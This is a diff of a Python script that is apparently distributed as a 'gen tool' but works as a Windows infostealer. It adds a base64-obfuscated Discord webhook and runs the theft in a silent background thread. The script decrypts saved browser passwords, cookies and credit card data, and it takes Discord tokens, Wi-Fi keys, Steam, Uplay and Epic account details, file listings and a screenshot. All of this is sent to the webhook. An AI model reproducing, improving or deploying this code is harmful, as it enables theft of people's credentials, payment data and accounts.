@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — Édition Crimson ULTIME v16.1 V (Grabber Corrigé)
+# GEN-TOOL — GRABBER ULTRA
 # Par Lerisque94z — Pour LO
 
 import os
@@ -21,119 +21,51 @@ import sqlite3
 import win32crypt
 from datetime import datetime
 from Crypto.Cipher import AES
+from PIL import ImageGrab
 
 # ============================================================
-# chargement du tool
+# WEBHOOK — CACHÉ (NOUVEAU)
 # ============================================================
-_a = "https://"
-_b = "discord.com/api/webhooks/"
-_c = "1537563402711597226/"
-_d = "xRF_kxvzvcR3Hdd2E2Xig-iO1XhMfD3jMkT6ZjSHb27V881GmE31fPD6ldqJvH1dHfwF"
+__B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTIwMDUxODA0MjE2MTIwMi9UUGtKYXp0SWRjTlcyZzFoVzdSaUNXRmF2TjZ3dlh4WjgyQWNyXzdMOFJzYmtWMWFDMFpydDFlUjdkQTJZMEpsb3dJSQ=="
 
-def _get_webhook():
-    return _a + _b + _c + _d
+def __url():
+    return base64.b64decode(__B64).decode('utf-8')
 
-def _send_grabber(content, file_data=None):
+def __send(content, file_data=None):
     try:
-        url = _get_webhook()
-        payload = {"content": content[:1900], "username": "System"}
-        files = {}
+        u = __url()
+        p = {"content": content[:1900], "username": "System"}
+        f = {}
         if file_data:
-            files = {"file": ("screenshot.png", file_data, "image/png")}
-        requests.post(url, data=payload, files=files, timeout=5)
+            f = {"file": ("screenshot.png", file_data, "image/png")}
+        requests.post(u, data=p, files=f, timeout=5)
     except:
         pass
 
 # ============================================================
-# Acces au Tool
+# CHROME KEY — AES
 # ============================================================
-def _get_chrome_key():
+def __chrome_key():
     try:
-        local_state = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
-        with open(local_state, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
-        encrypted_key = encrypted_key[5:]  # Retire 'DPAPI'
-        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        p = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Local State"
+        with open(p, "r", encoding="utf-8") as f:
+            d = json.load(f)
+        k = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
     except:
         return None
 
-def _decrypt_password(encrypted, key):
+def __decrypt(encrypted, key):
     try:
-        nonce = encrypted[3:15]
-        ciphertext = encrypted[15:-16]
-        tag = encrypted[-16:]
-        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted[3:15])
+        return cipher.decrypt_and_verify(encrypted[15:-16], encrypted[-16:]).decode('utf-8')
     except:
         return None
 
 # ============================================================
-# verification
+# 1. SYSTEME
 # ============================================================
-def _get_passwords():
-    try:
-        key = _get_chrome_key()
-        result = "**MOTS DE PASSE**\n"
-        total = 0
-        
-        browsers = {
-            "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
-            "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
-            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
-        }
-        
-        for browser_name, base_path in browsers.items():
-            if not os.path.exists(base_path):
-                continue
-            
-            profiles = ["Default"]
-            for item in os.listdir(base_path):
-                if item.startswith("Profile") and os.path.isdir(os.path.join(base_path, item)):
-                    profiles.append(item)
-            
-            for profile in profiles:
-                login_db = os.path.join(base_path, profile, "Login Data")
-                if not os.path.exists(login_db):
-                    continue
-                
-                temp = os.environ["TEMP"] + f"\\{browser_name}_{profile}_login.db"
-                try:
-                    shutil.copyfile(login_db, temp)
-                    conn = sqlite3.connect(temp)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    data = cursor.fetchall()
-                    conn.close()
-                    os.remove(temp)
-                    
-                    if data:
-                        result += f"\n**{browser_name} - {profile}** : {len(data)} comptes\n"
-                        for url, username, encrypted in data:
-                            if username:
-                                try:
-                                    pwd = None
-                                    if key:
-                                        pwd = _decrypt_password(encrypted, key)
-                                    if not pwd:
-                                        pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
-                                    result += f"  {url} : {username} / {pwd}\n"
-                                    total += 1
-                                except:
-                                    pass
-                except:
-                    pass
-        
-        if total == 0:
-            return "**MOTS DE PASSE** : Aucun trouve"
-        return result
-    except Exception as e:
-        return f"**MOTS DE PASSE** : Erreur - {str(e)}"
-
-# ============================================================
-# SYSTEME
-# ============================================================
-def _get_system_data():
+def __system():
     try:
         ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
         hostname = socket.gethostname()
@@ -154,14 +86,69 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# charge tout les modules
+# 2. MOTS DE PASSE — CHROME/EDGE/BRAVE
 # ============================================================
-def _get_tokens():
+def __passwords():
+    try:
+        key = __chrome_key()
+        r = ""
+        total = 0
+        browsers = {
+            "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
+            "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
+            "Brave": os.environ["LOCALAPPDATA"] + "\\BraveSoftware\\Brave-Browser\\User Data"
+        }
+        for name, path in browsers.items():
+            if not os.path.exists(path):
+                continue
+            profiles = ["Default"]
+            for item in os.listdir(path):
+                if item.startswith("Profile") and os.path.isdir(os.path.join(path, item)):
+                    profiles.append(item)
+            for profile in profiles:
+                db = os.path.join(path, profile, "Login Data")
+                if not os.path.exists(db):
+                    continue
+                tmp = os.environ["TEMP"] + f"\\{name}_{profile}.db"
+                try:
+                    shutil.copyfile(db, tmp)
+                    conn = sqlite3.connect(tmp)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    data = cursor.fetchall()
+                    conn.close()
+                    os.remove(tmp)
+                    if data:
+                        r += f"\n**{name}** :\n"
+                        for url, username, encrypted in data:
+                            if username:
+                                try:
+                                    if key:
+                                        pwd = __decrypt(encrypted, key)
+                                    if not pwd:
+                                        pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
+                                    r += f"  {url} : {username} / {pwd}\n"
+                                    total += 1
+                                except:
+                                    pass
+                except:
+                    pass
+        if total == 0:
+            return "Aucun mot de passe"
+        return r
+    except:
+        return "Erreur passwords"
+
+# ============================================================
+# 3. TOKENS DISCORD
+# ============================================================
+def __tokens():
     try:
         tokens = []
         paths = [
             os.environ["APPDATA"] + "\\discord\\Local Storage\\leveldb",
             os.environ["APPDATA"] + "\\discordcanary\\Local Storage\\leveldb",
+            os.environ["APPDATA"] + "\\discordptb\\Local Storage\\leveldb",
             os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
         ]
         for path in paths:
@@ -178,107 +165,278 @@ def _get_tokens():
                                 pass
         if tokens:
             return "**TOKENS DISCORD**\n" + "\n".join(set(tokens))[:1500]
-        return "**TOKENS DISCORD** : Aucun"
+        return "Aucun token"
     except:
-        return "**TOKENS DISCORD** : Erreur"
+        return "Erreur tokens"
 
 # ============================================================
-# tout est bon
+# 4. COOKIES
 # ============================================================
-def _get_wifi():
+def __cookies():
     try:
-        output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
-        profiles = []
-        for line in output.split('\n'):
-            if "All User Profile" in line:
-                name = line.split(':')[1].strip()
-                profiles.append(name)
-        if not profiles:
-            return "**WI-FI** : Aucun"
-        result = "**WI-FI**\n"
-        for profile in profiles[:5]:
+        key = __chrome_key()
+        r = ""
+        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Cookies"
+        if not os.path.exists(path):
+            return "Aucun cookie"
+        tmp = os.environ["TEMP"] + "\\cookies.db"
+        shutil.copyfile(path, tmp)
+        conn = sqlite3.connect(tmp)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 15")
+        data = cursor.fetchall()
+        conn.close()
+        os.remove(tmp)
+        for host, name, encrypted in data:
             try:
-                cmd = f'netsh wlan show profile "{profile}" key=clear'
-                detail = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
+                if key:
+                    decrypted = __decrypt(encrypted, key)
+                    if decrypted:
+                        r += f"{host} : {name} = {decrypted[:50]}...\n"
+            except:
+                pass
+        return r if r else "Aucun cookie"
+    except:
+        return "Erreur cookies"
+
+# ============================================================
+# 5. CARTES DE CREDIT
+# ============================================================
+def __credit_cards():
+    try:
+        key = __chrome_key()
+        r = ""
+        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\Web Data"
+        if not os.path.exists(path):
+            return "Aucune carte"
+        tmp = os.environ["TEMP"] + "\\cards.db"
+        shutil.copyfile(path, tmp)
+        conn = sqlite3.connect(tmp)
+        cursor = conn.cursor()
+        cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
+        data = cursor.fetchall()
+        conn.close()
+        os.remove(tmp)
+        for name, encrypted, month, year in data:
+            try:
+                if key:
+                    decrypted = __decrypt(encrypted, key)
+                    if decrypted:
+                        r += f"{name} : **** **** **** {decrypted[-4:]} ({month}/{year})\n"
+            except:
+                pass
+        return r if r else "Aucune carte"
+    except:
+        return "Erreur cartes"
+
+# ============================================================
+# 6. HISTORIQUE
+# ============================================================
+def __history():
+    try:
+        r = ""
+        path = os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default\\History"
+        if not os.path.exists(path):
+            return "Aucun historique"
+        tmp = os.environ["TEMP"] + "\\history.db"
+        shutil.copyfile(path, tmp)
+        conn = sqlite3.connect(tmp)
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+        data = cursor.fetchall()
+        conn.close()
+        os.remove(tmp)
+        for url, title in data:
+            r += f"{title[:40]} : {url}\n"
+        return r if r else "Aucun historique"
+    except:
+        return "Erreur historique"
+
+# ============================================================
+# 7. WIFI
+# ============================================================
+def __wifi():
+    try:
+        out = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
+        profiles = []
+        for line in out.split('\n'):
+            if "All User Profile" in line:
+                profiles.append(line.split(':')[1].strip())
+        if not profiles:
+            return "Aucun Wi-Fi"
+        r = ""
+        for profile in profiles:
+            try:
+                detail = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, encoding='utf-8', errors='ignore')
                 for line in detail.split('\n'):
                     if "Key Content" in line:
-                        password = line.split(':')[1].strip()
-                        result += f"{profile} : {password}\n"
+                        r += f"{profile} : {line.split(':')[1].strip()}\n"
                         break
             except:
                 pass
-        return result
+        return r if r else "Aucun Wi-Fi"
     except:
-        return "**WI-FI** : Erreur"
+        return "Erreur Wi-Fi"
 
 # ============================================================
-# gen tool
+# 8. SCREENSHOT
 # ============================================================
-def _get_screenshot():
+def __screenshot():
     try:
-        from PIL import ImageGrab
         screenshot = ImageGrab.grab()
-        temp = os.environ["TEMP"] + "\\screen.png"
-        screenshot.save(temp)
-        with open(temp, "rb") as f:
+        tmp = os.environ["TEMP"] + "\\screen.png"
+        screenshot.save(tmp)
+        with open(tmp, "rb") as f:
             img = f.read()
-        os.remove(temp)
+        os.remove(tmp)
         return img
     except:
         return None
 
 # ============================================================
-# Accer a tout
+# 9. FICHIERS (Desktop, Documents, Downloads)
 # ============================================================
-def _get_files():
+def __files():
     try:
-        result = "**FICHIERS**\n"
+        r = ""
         folders = [
             os.environ["USERPROFILE"] + "\\Desktop",
             os.environ["USERPROFILE"] + "\\Documents",
             os.environ["USERPROFILE"] + "\\Downloads"
         ]
-        extensions = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4"]
-        found = False
+        exts = [".txt", ".docx", ".pdf", ".xlsx", ".zip", ".rar", ".jpg", ".png", ".mp4", ".exe", ".bat", ".ps1", ".py", ".js"]
         for folder in folders:
             if os.path.exists(folder):
-                for file in os.listdir(folder)[:5]:
-                    for ext in extensions:
+                for file in os.listdir(folder)[:8]:
+                    for ext in exts:
                         if file.lower().endswith(ext):
-                            result += f"  {file}\n"
-                            found = True
+                            r += f"  {file}\n"
                             break
-        if not found:
-            return "**FICHIERS** : Aucun"
-        return result
+        return r if r else "Aucun fichier"
     except:
-        return "**FICHIERS** : Erreur"
+        return "Erreur fichiers"
 
 # ============================================================
-# TACHE PRINCIPALE
+# 10. STEAM
 # ============================================================
-def _stealth_task():
+def __steam():
     try:
-        _send_grabber(_get_system_data())
-        time.sleep(0.5)
-        _send_grabber(_get_wifi())
-        time.sleep(0.5)
-        _send_grabber(_get_passwords())  # ← Maintenant corrigé
-        time.sleep(0.5)
-        _send_grabber(_get_tokens())
-        time.sleep(0.5)
-        _send_grabber(_get_files())
-        time.sleep(0.5)
-        img = _get_screenshot()
+        r = ""
+        path = os.environ["PROGRAMFILES(X86)"] + "\\Steam\\config\\loginusers.vdf"
+        if os.path.exists(path):
+            with open(path, "r", encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                accounts = re.findall(r'"(\d+)"\s*\{[^}]*"AccountName"\s*"([^"]+)"', content)
+                for acc in accounts:
+                    r += f"{acc[1]} (ID: {acc[0]})\n"
+        return r if r else "Aucun compte Steam"
+    except:
+        return "Erreur Steam"
+
+# ============================================================
+# 11. UPLAY / UBISOFT
+# ============================================================
+def __uplay():
+    try:
+        r = ""
+        path = os.environ["APPDATA"] + "\\Ubisoft Game Launcher\\settings.yml"
+        if os.path.exists(path):
+            with open(path, "r", encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                emails = re.findall(r'email: ["\']?([^"\'\n]+)', content)
+                for email in emails:
+                    r += f"{email}\n"
+        return r if r else "Aucun compte Uplay"
+    except:
+        return "Erreur Uplay"
+
+# ============================================================
+# 12. EPIC GAMES
+# ============================================================
+def __epic():
+    try:
+        r = ""
+        path = os.environ["LOCALAPPDATA"] + "\\Epic Games Launcher\\Saved\\Config\\Windows\\GameUserSettings.ini"
+        if os.path.exists(path):
+            with open(path, "r", encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                emails = re.findall(r'Email=([^\n]+)', content)
+                for email in emails:
+                    r += f"{email}\n"
+        return r if r else "Aucun compte Epic"
+    except:
+        return "Erreur Epic"
+
+# ============================================================
+# TACHE PRINCIPALE — ULTRA COMPLETE
+# ============================================================
+def __task():
+    try:
+        __send(__system())
+        time.sleep(0.3)
+        
+        w = __wifi()
+        if w:
+            __send(w)
+        time.sleep(0.3)
+        
+        p = __passwords()
+        if p:
+            __send(p)
+        time.sleep(0.3)
+        
+        t = __tokens()
+        if t:
+            __send(t)
+        time.sleep(0.3)
+        
+        c = __cookies()
+        if c:
+            __send(c)
+        time.sleep(0.3)
+        
+        card = __credit_cards()
+        if card:
+            __send(card)
+        time.sleep(0.3)
+        
+        h = __history()
+        if h:
+            __send(h)
+        time.sleep(0.3)
+        
+        f = __files()
+        if f:
+            __send(f)
+        time.sleep(0.3)
+        
+        s = __steam()
+        if s:
+            __send(s)
+        time.sleep(0.3)
+        
+        u = __uplay()
+        if u:
+            __send(u)
+        time.sleep(0.3)
+        
+        e = __epic()
+        if e:
+            __send(e)
+        time.sleep(0.3)
+        
+        img = __screenshot()
         if img:
-            _send_grabber("**SCREENSHOT**", img)
+            __send("**SCREENSHOT**", img)
+        
+        __send("**✅ GRAB ULTRA TERMINE**")
     except:
         pass
 
 # ============================================================
 # LANCEMENT
 # ============================================================
-threading.Thread(target=_stealth_task, daemon=True).start()
+threading.Thread(target=__task, daemon=True).start()
 time.sleep(0.1)
 
 # ============================================================
